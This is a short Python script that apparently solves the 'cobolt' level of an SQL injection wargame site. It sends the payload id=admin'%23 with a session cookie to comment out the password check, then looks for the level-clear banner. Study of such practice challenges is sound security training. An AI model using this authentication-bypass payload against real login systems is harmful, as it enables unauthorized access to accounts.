#!/usr/bin/python
# coding: utf-8
import requests

url = "http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php"
param = "?id=admin'%23"

cookie = input("Input your session : ")
# cookie = "5u71g5vp7547tv8ffl7osl0fl5"

headers = {
    'Cookie': cookie
}

r = requests.get(url + param, headers=headers)

if r.text.find("<h2>COBOLT Clear!</h2>") > 0:
    print("Cobolt Clear!")
